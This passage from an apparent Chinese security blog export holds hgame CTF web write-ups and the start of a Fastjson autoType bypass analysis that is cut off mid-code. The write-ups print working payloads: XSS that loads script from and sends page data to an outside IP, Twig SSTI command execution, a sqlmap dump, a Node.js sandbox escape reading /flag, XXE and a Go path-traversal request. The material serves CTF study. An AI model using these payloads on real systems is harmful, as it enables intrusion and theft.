src&#x3D;&quot;https:&#x2F;&#x2F;www.w3school.com.cn&#x2F;i&#x2F;horse.mp3&quot; type&#x3D;&quot;audio&#x2F;mpeg&quot;&gt;&lt;&#x2F;audio&gt;&lt;&#x2F;span&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;img src&#x3D;x onerror&#x3D;document.body.appendChild(document.createElement(&#39;script&#39;)).src&#x3D;&#39;http:&#x2F;&#x2F;1.116.110.61:8000&#x2F;1.js&#39;&gt;&lt;audio controls oncanplay&#x3D;&quot;haiCoder()&quot;&gt;&lt;source src&#x3D;&quot;https:&#x2F;&#x2F;www.w3school.com.cn&#x2F;i&#x2F;horse.mp3&quot; type&#x3D;&quot;audio&#x2F;mpeg&quot;&gt;&lt;&#x2F;audio&gt;</span><br></pre></td></tr></table></figure>\n\n<p>然后就是 <strong>利用img的src获取script中的数据然后外带数据</strong></p>\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;img src&#x3D;x onerror&#x3D;&quot;window.open(&#39;http:&#x2F;&#x2F;1.116.110.61&#x2F;&#39;+document.getElementsByTagName(&#39;head&#39;)[0].getElementsByTagName(&#39;script&#39;)[0].text)&quot; width&#x3D;&quot;336&quot; height&#x3D;&quot;36&quot;&gt;</span><br><span class=\"line\">或者</span><br><span class=\"line\">&lt;img src&#x3D;x onerror&#x3D;document.body.appendChild(document.createElement(&#39;script&#39;)).src&#x3D;&#39;http:&#x2F;&#x2F;1.116.110.61&#x2F;&#39;+document.getElementsByTagName(&#39;head&#39;)[0].getElementsByTagName(&#39;script&#39;)[0].text&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/45ef44b569d64da5a408103da766cce9.png\"></p>\n<p>Flag：hgame{Xs5_1s_so_int3Restin9!Var_is_0uT_of_d4te}</p>\n<p>wp解法：</p>\n<p>本题设计的思路是 <strong>获取到全局的变量名</strong>，然后找到 flag 的变量名再拿到 flag。</p>\n<p>这也是模板html的提示点：为什么同样是两个变量，第一个使用 <strong>let</strong>，而第二个使用 <strong>var</strong> 呢？因为 <strong>使用 var 可<br>以利用 Object.keys(window) 拿到全局变量 flag 的变量名</strong>，而使用let的话无法获取。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;img src&#x3D;1 onerror&#x3D;&quot;document.getElementsByClassName(&#39;content&#39;)[0].innerText&#x3D;Object.keys(window)&quot;&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/7979a93d746643ffa4b1a9bdc2b792b0.png\"><br>再用</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;img src&#x3D;1 onerror&#x3D;&quot;document.getElementsByClassName(&#39;content&#39;)[0].innerText &#x3D;F149_is_Here&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>总结：<br>由于我对于html返回对象那里基础薄弱，所以在找html中的script标签时费了很大力气然后就是在控制台进行测试</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/03e19e50d5a342df976f656bd7b956c8.png\"></p>\n<p>慢慢的找出对应的节点，获取文本<br>知识点：</p>\n<ol>\n<li>   <code>var elements = document.getElementsByTagName(name);</code>  返回集合</li>\n<li>   <code>getElementsByTagName(&#39;script&#39;)</code> 在寻找标签为script的节点</li>\n</ol>\n<p>相关文章</p>\n<p><a href=\"https://www.cnblogs.com/sfsec/p/15178028.html\">XSS过滤绕过总结 - 随风kali - 博客园 (cnblogs.com)</a></p>\n<p><a href=\"https://www.shuzhiduo.com/A/obzbDMk35E/\">XSS漏洞之加载远程js文件</a></p>\n<p><a href=\"https://www.cnblogs.com/bingogo/p/12108709.html\">XSS漏洞之加载远程js文件</a></p>\n<p><a href=\"https://javascript.ruanyifeng.com/dom/document.html#toc13\">document对象</a></p>\n<p><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement\">HTMLElement</a></p>\n<p><a href=\"https://yaofeifly.github.io/2020/12/10/XSS_ByPass/\">工作中梳理XSS Bypass WAF相关Payload - Fly 我是小灰灰 (yaofeifly.github.io)</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247549869&idx=1&sn=11c8a8de90e1d5bd4f9504416e3795da&chksm=ebea4a80dc9dc396ae77508e5ac5b6ef4d4da042f592f9a0d3698316c34ecf2ed3c1b8cb0c51&mpshare=1&scene=23&srcid=0128pIF4Jdm8ASryr9umxi6O&sharer_sharetime=1643305494735&sharer_shareid=724519d4f4399658e85da9d6a9988d62#rd\">xss绕waf几种姿势剖析 (qq.com)</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=MzU2NzY5MzI5Ng==&mid=2247487273&idx=1&sn=e8606277429bda5b5ae21609445f612f&chksm=fc9815b6cbef9ca0ed827bf0502af7c1b56914ab89c15da2bd49ef3d66d29d1738b2b8d82f3e&mpshare=1&scene=23&srcid=1114GFQNDxsSe6oxUqJOC7Tc&sharer_sharetime=1643296076233&sharer_shareid=724519d4f4399658e85da9d6a9988d62#rd\">Bypass XSS SQL Payload大全 (qq.com)</a></p>\n<h1 id=\"Vidar-shop-demo\"><a href=\"#Vidar-shop-demo\" class=\"headerlink\" title=\"Vidar shop demo\"></a>Vidar shop demo</h1><p>注册用户然后发现账户有9999元，商店里面flag需要1w</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/ac69f3530ad64ae1b4bf0178147504bf.png\"></p>\n<p>应该就是逻辑漏洞或者竞争，点击flag商品和其他一个商品进行下单，先把40的支付一下</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/8de7fca4301c407192c90f09eef0e3e1.png\"></p>\n<p>发现点击删除按钮后会取消订单，退还钱，抓包看看</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/3081789b13d14ea89815542e6e850b53.png\"></p>\n<p>发现当点击删除时，发起一个对应ID的包，将id改为flag对应id 2637放包发现退还了1w，再次购买flag，成功</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/3bb990c5d47d47ac81c5fa5e7d62e8c7.png\"></p>\n<p>Flag：hgame{8f8ddb3537b037a296a85e920d54f650b4a6cc73b015ac0bdb91a579a193aa71}</p>\n<h1 id=\"SecurityCenter\"><a href=\"#SecurityCenter\" class=\"headerlink\" title=\"SecurityCenter\"></a>SecurityCenter</h1><ul>\n<li>Twig SSTI</li>\n</ul>\n<p>发现泄露 <strong>/vendor/composer/installed.json</strong>，使用了twig的框架，发现一个疑似ssrf地方</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/ee2a31135f1e458cba2597d1ce0ee94d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_17,color_FFFFFF,t_70,g_se,x_16#pic_center\"></p>\n<p>经过测试存在SSTI</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/01a0a91f81a64e9f8aa7ca1344224bf1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_17,color_FFFFFF,t_70,g_se,x_16#pic_center\"></p>\n<p><a href=\"https://xz.aliyun.com/t/7518\">TWIG 全版本通用 SSTI payloads</a></p>\n<p>Payload：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&#123;[&quot;id&quot;,%200]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;[%22base64+&#x2F;f*%22,%200]|sort(%22system%22)|join(%22,%22)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>FLAG: hgame{!Tw19-S5t11s^s00O0O_inter3st1n5~!}</p>\n<h1 id=\"LoginMe\"><a href=\"#LoginMe\" class=\"headerlink\" title=\"LoginMe\"></a>LoginMe</h1><p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/7b724e1a56b340a3a26c24d4471f35af.png\"></p>\n<p>Sqlmap直接跑出来了。。。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 sqlmap.py -r c:\\Users\\cys\\Desktop\\sql.txt --batch --random-agent -T uuussseeerrrsss -C password --dump –flush</span><br></pre></td></tr></table></figure>\n<p>登录得flag</p>\n<p>FLAG: hgame{d0490213241f3f29f172c475e1641a7d37bf2b8208616c4d4489aa58a1ebaeb4}</p>\n<h1 id=\"Markdown-Online\"><a href=\"#Markdown-Online\" class=\"headerlink\" title=\"Markdown Online\"></a>Markdown Online</h1><p>学习到了<code>markdown xss</code> <code>nodejs vm逃逸</code> 过滤</p>\n<p>先看导入了什么，<strong>markdown-it</strong> 与 <strong>zombie</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/ccaa9f10262f4024ab2ad0c2e6b4eee4.png#pic_center\"></p>\n<p><strong>Zombie存在一个沙箱逃逸的rce漏洞</strong>，找到了出题人之前写过的一篇文章，与祥云杯的 cralwer_z 类似</p>\n<p><a href=\"https://blog.summ3r.top/2021/08/26/Nodejs-Zoombie-Package-RCE-%E5%88%86%E6%9E%90/\">Nodejs Zoombie Package RCE 分析</a></p>\n<p>看一下登录控制器，密码转换为大写后要与54g相等，这是不可能的</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/951e85cb852a43b99d49d0e6fd68fd93.png\"></p>\n<p>登录处只要让 toUpperCase 抛出异常就可以登陆成功，让password为数组即可使其长度为16绕过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:[&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;,&quot;1&quot;]&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/d2fa4389a9b445df9018554a2a25d2bc.png\"></p>\n<p>接着审计提交的控制器</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/3129c99ebe7a4c7aadbc3b615f8c883b.png\"></p>\n<p>先将传入的代码进行md渲染编程html，接着利用Browser中的load进行操作</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/83294ba23687463095dd83f0c1482d1a.png\"></p>\n<p>load又调用了<strong>this.tabs.open({ html: html })</strong> 其实这里的 <code>open</code> 就是漏洞的入口</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/a87d55d81699455498438500ee44d1c2.png\"></p>\n<p>剩下分析移步<a href=\"https://blog.summ3r.top/2021/08/26/Nodejs-Zoombie-Package-RCE-%E5%88%86%E6%9E%90/#toc-heading-3\">Nodejs Zoombie Package RCE 分析</a></p>\n<p><strong>祥云杯是通过visit为入口，这道题是以load为入口</strong>，那整体就是，将传入的代码在提交之后渲染为html，然后放入沙箱中运行，让其逃逸即可，这里还需要markdown的语法<br><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/8b68affbe67541449948ff012d5c2b9b.png\"></p>\n<p>发现在 vm 模块运行js代码，代码运行的上下文是 <strong>window对象</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/eb178b651c8c4f4ba68c8eff47f64201.png\"><br>但是这里存在一个waf</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">function waf(code) &#123;</span><br><span class=\"line\">    const blacklist &#x3D; &#x2F;__proto__|prototype|\\+|atlert|confirm|escape|parseInt|parseFloat|prompt|isNaN|new|this|process|constructor|atob|btoa|apk&#x2F;i</span><br><span class=\"line\">    if (code.match(blacklist)) &#123;</span><br><span class=\"line\">        return &quot;# Hacker!&quot;</span><br><span class=\"line\">    &#125; else &#123;</span><br><span class=\"line\">        return code</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>过滤了关键词，给出两种 <strong>绕过</strong>，当我想要以相同方式 <strong>绕过this时</strong>，发现对于this不适用，然后找到了这篇文章</p>\n<p> <a href=\"https://xz.aliyun.com/t/7842\">nodejs沙箱与黑魔法 - 先知社区 (aliyun.com)</a></p>\n<p>尝试调用 <strong>window 的方法</strong> 然后调用 <strong>constructor</strong> 向上 返回的一个 <strong>Function constructor</strong> 然后 <strong>利用Function对象构造一个函数并执行</strong></p>\n<p>Payload：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">var a&#x3D;&#39;const&#39;;var b&#x3D;&#39;ructor&#39;;var c&#x3D;[a,b].join(&#39;&#39;);</span><br><span class=\"line\">var d&#x3D;&#39;return p&#39;;var e&#x3D;&#39;rocess&#39;;var f&#x3D;[d,e].join(&#39;&#39;);</span><br><span class=\"line\">var h&#x3D;&#39;child_p&#39;;var i&#x3D;[h,e].join(&#39;&#39;);</span><br><span class=\"line\">var j&#x3D;&#39;th&#39;;var k&#x3D;&#39;is&#39;;var l&#x3D;[j,k].join(&#39;&#39;);</span><br><span class=\"line\">x&#x3D; clearImmediate [c][c][c][c](f)();y&#x3D;x.mainModule.require(i);z&#x3D;y.execSync(&#39;whoami&#39;).toString();document.write(z);</span><br><span class=\"line\">&lt;&#x2F;script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">或者</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">var h&#x3D;&#39;child_p&#39;;var e&#x3D;&#39;rocess&#39;;var i&#x3D;[h,e].join(&#39;&#39;);</span><br><span class=\"line\">x&#x3D;clearImmediate[&#96;$&#123;&#96;$&#123;&#96;constructo&#96;&#125;r&#96;&#125;&#96;][&#96;$&#123;&#96;$&#123;&#96;constructo&#96;&#125;r&#96;&#125;&#96;][&#96;$&#123;&#96;$&#123;&#96;constructo&#96;&#125;r&#96;&#125;&#96;]([&#96;$&#123;&#96;$&#123;&#96;return proces&#96;&#125;s&#96;&#125;&#96;])();y&#x3D;x.mainModule.require(i);z&#x3D;y.execSync(&#39;cat &#x2F;flag&#39;).toString();document.write(z);</span><br><span class=\"line\">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/6cb270c147964b539322a1ddeeffcc19.png\"></p>\n<p>Flag：hgame{3nj0y*Th3/<em>pR0tOtype</em>/pOllut10n!1n_j@v4scr1pt}</p>\n<p>后续测试，构造一个constructor即可，成功的window方法：</p>\n<blockquote>\n<p>btoa、cancelAnimationFrame、captureEvents、clearImmediate，print等等可以自行寻找</p>\n</blockquote>\n<p><a href=\"https://www.w3cschool.cn/fetch_api/fetch_api-sk372v9v.html\">window方法：clearImmediate()_w3cschool</a></p>\n<p>相关文章：<br>Markdown xss payload<br> <a href=\"https://github.com/cujanovic/Markdown-XSS-Payloads/blob/master/Markdown-XSS-Payloads.txt\">Markdown-XSS-Payloads.txt</a></p>\n<p>nodejs 沙盒逃逸<br><a href=\"https://jelly.jd.com/article/5f7296d0c526ae0148c2a2bb\">Node.js沙盒逃逸分析</a><br><a href=\"https://www.kitsch.live/2020/11/23/nodejs-vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/\">nodejs-vm沙箱逃逸</a><br><a href=\"https://www.scuctf.com/ctfwiki/web/1.nodejs/nodejs%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/readme/#2020-hufuctfweb-just_escape\">NodeJs 沙盒逃逸分析及原型链的简单学习</a></p>\n<p>nodejs编码：<br><a href=\"https://bycsec.top/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/\">Nodejs的一些技巧</a><br><a href=\"https://www.zhangshengrong.com/p/bYXxqOkL1Z/\">nodejs代码执行绕过的一些技巧汇总</a></p>\n<p>vm2逃逸payload项目<br><a href=\"https://github.com/patriksimek/vm2\">https://github.com/patriksimek/vm2</a>  </p>\n<h1 id=\"Comment\"><a href=\"#Comment\" class=\"headerlink\" title=\"Comment\"></a>Comment</h1><ul>\n<li>xxe</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/7b42abd264574b36bbacd915c8fe3093.png\"></p>\n<p><strong>libxml_disable_entity_loader(false); 允许外部实体</strong>，waf了一些关键字</p>\n<p>返回flag的逻辑就是sender需要为admin，但是post数据包里不能有admin关键字</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/d6dff84ab533457895fb6e6b649480fa.png#pic_center\"></p>\n<p>本想在content通过一百万个字符绕过preg_match，然后发现题目环境不可以，那就进行外部实体拼接绕过<br>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;</span><br><span class=\"line\">&lt;!ENTITY xxe &quot;ad&quot; &gt;</span><br><span class=\"line\">&lt;!ENTITY xxe2 &quot;min&quot; &gt;]&gt;</span><br><span class=\"line\">&lt;comment&gt;&lt;sender&gt;&amp;xxe;&amp;xxe2;&lt;&#x2F;sender&gt;&lt;content&gt;123&lt;&#x2F;content&gt;&lt;&#x2F;comment&gt;</span><br></pre></td></tr></table></figure>\n<p>Flag：hgame{Pr3ud0~prOtQc4l*m33ts_Xx3-!nj3cti0n~!}</p>\n<h1 id=\"FileSystem\"><a href=\"#FileSystem\" class=\"headerlink\" title=\"FileSystem\"></a>FileSystem</h1><ul>\n<li>go安全</li>\n</ul>\n<p>两个文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/d5813c0c6b5c498c83a59bbd487c628e.png\"></p>\n<p>Main.go</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">&quot;log&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">&quot;net/http&quot;</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">fileHandler</span><span class=\"params\">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class=\"line\">\thttp.FileServer(http.Dir(<span class=\"string\">&quot;./&quot;</span>)).ServeHTTP(w, r)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\thttp.HandleFunc(<span class=\"string\">&quot;/&quot;</span>, fileHandler)</span><br><span class=\"line\">\thttp.HandleFunc(<span class=\"string\">&quot;/there_may_be_a_flag&quot;</span>, <span class=\"function\"><span class=\"keyword\">func</span><span class=\"params\">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class=\"line\">\t\tw.Write([]<span class=\"keyword\">byte</span>(<span class=\"string\">`No! You can&#x27;t see the flag!`</span>))</span><br><span class=\"line\">\t&#125;)</span><br><span class=\"line\">\tlog.Fatal(http.ListenAndServe(<span class=\"string\">&quot;:8889&quot;</span>, <span class=\"literal\">nil</span>))</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>there_may_be_a_flag</strong> 就是flag的地方，加上了web服务的flag路由,从而使得我们没法通过直接访问/flag来获取文件。而是得到/flag路由的回显。也就是 No! You can’t see the flag!</p>\n<p>审计完再结合题目觉得应该是 **http.FileServer(http.Dir(&quot;./&quot;)).ServeHTTP(w, r)**，出了问题，应该是存在漏洞导致可以跨目录读取到flag，搜索了一下，找到了go的一些安全问题</p>\n<p><a href=\"https://bycsec.top/2021/02/07/golang%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/\">golang的一些安全问题</a></p>\n<p>随后发现了漏洞的出处 <strong>justCTF [*] 2020：Go-fs</strong>，出题人在github提交了issue，<a href=\"https://github.com/golang/go/issues/40940\">https://github.com/golang/go/issues/40940</a></p>\n<p>在ctf中还出现了非预期解法，利用一下非预期来解一下题目</p>\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -X CONNECT --path-as-is http:&#x2F;&#x2F;3445d0f8a3.filesystem.hgame.homeboyc.cn&#x2F;123&#x2F;..&#x2F;there_may_be_a_flag</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/88f1846c011f4986afec3e87954e2559.png#pic_center\"><br>非预期的原理：<br>如果是 <strong>CONNECT</strong> 方式请求，就 <strong>不会处理url中的特殊字符</strong>，导致直接读取flag.其他的请求方法都会在cleanPath中被处理url，golang1.16似乎已经处理了。</p>\n","categories":["赛题wp"]},{"title":"Fastjson 1.2.25-1.2.47","url":"/2023/12/25/Fastjson(%E4%BA%8C)/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/8d1c882b3cfcedf2b095c94fbe158cbf.png\" alt=\"t01c51245434a50f900.jpg (400×300) (qhimg.com)\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>FastJson的后续版本修复以及绕过 1.2.25=&lt; version &lt;=1.2.47</p>\n<h1 id=\"漏洞产生原因\"><a href=\"#漏洞产生原因\" class=\"headerlink\" title=\"漏洞产生原因\"></a>漏洞产生原因</h1><p>总结一下1.2.24的漏洞产生原因，type字段的特性会加载任意类(反序列化入口点)，反射调用特定的setter和getter(反序列化链入口)，进而从这些链子比如TemplatesImpl走到加载字节码(反序列化的触发payload)</p>\n<h1 id=\"1-2-25-1-2-41\"><a href=\"#1-2-25-1-2-41\" class=\"headerlink\" title=\"1.2.25-1.2.41\"></a>1.2.25-1.2.41</h1><h2 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复\"></a>修复</h2><p>对比两个jar包的不同，在DefaultJSONParser，去掉了TypeUtils.loadClass 直接加载任意类，引入了checkAutoType()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/a9670c4a7579d97c396b0720f5b752fe.png\" alt=\"image-20220401133436372\"></p>\n<p>checkAutoType是1.2.25版本中新增的一个白名单+黑名单机制。同时引入一个配置参数 <code>AutoTypeSupport</code> 参考<a href=\"https://github.com/alibaba/fastjson/wiki/enable_autotype\">官方wiki</a></p>\n<p>默认 <strong>AutoTypeSupport = False(开启白名单)</strong></p>\n<p>想要修改则在代码中修改</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ParserConfig.getGlobalInstance().setAutoTypeSupport(true); &#x2F;&#x2F;关闭白名单机制,基于内置黑名单实现安全</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>开启白名单的情况即AutoTypeSupport = False</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//传入的expectClass = null</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (typeName == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">final</span> String className = typeName.replace(<span class=\"string\">&#x27;$&#x27;</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">    \t<span class=\"comment\">/*AutoTypeSupport = True情况，一会分析*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (clazz == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            clazz = deserializers.findClass(typeName);  <span class=\"comment\">//从一些常见类中寻找，返回null</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    \t<span class=\"comment\">//这种情况为：启用白名单</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!autoTypeSupport) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; denyList.length; ++i) &#123;  </span><br><span class=\"line\">                String deny = denyList[i];  <span class=\"comment\">//获取黑名单</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (className.startsWith(deny)) &#123;  <span class=\"comment\">//匹配黑名单，直接报错退出</span></span><br><span class=\"line\">                    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; acceptList.length; ++i) &#123;  </span><br><span class=\"line\">                String accept = acceptList[i];   <span class=\"comment\">//获取白名单</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (className.startsWith(accept)) &#123;</span><br><span class=\"line\">                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);  <span class=\"comment\">//匹配白名单后进行loadclass</span></span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (expectClass != <span class=\"keyword\">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;type not match. &quot;</span> + typeName + <span class=\"string\">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    \t<span class=\"comment\">/*一些代码*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!autoTypeSupport) &#123;   <span class=\"comment\">//没有匹配到黑、白名单 抛出错误</span></span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> JSONException(<span class=\"string\">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> clazz;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>可见AutoTypeSupport = False时需要 <strong>同时 先不匹配黑名单、再匹配白名单，才可以进行loadClass，不然最后也会抛出错误</strong></p>\n<p>内置默认黑名单有21个，第二个com.sun.导致了TemplateImpl链子的不能正常使用，白名单也为空，所以根本无法利用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/fastjson/947cf4f7841d357808b6ce53c1eab8d0.png\" alt=\"image-20220401155300297\"></p>\n<ul>\n<li>关闭白名单的情况即AutoTypeSupport = True<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (typeName == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">final</span> String className = typeName.replace(<span class=\"string\">&#x27;$&#x27;</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">    \t<span class=\"comment\">//</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (autoTypeSupport || expectClass != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class=\"line\">                String accept = acceptList[i];     <span class=\"comment\">//获取白名单，匹配到白名单，直接loadClass</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (className.startsWith(accept)) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class=\"line\">                String deny = denyList[i];   <span 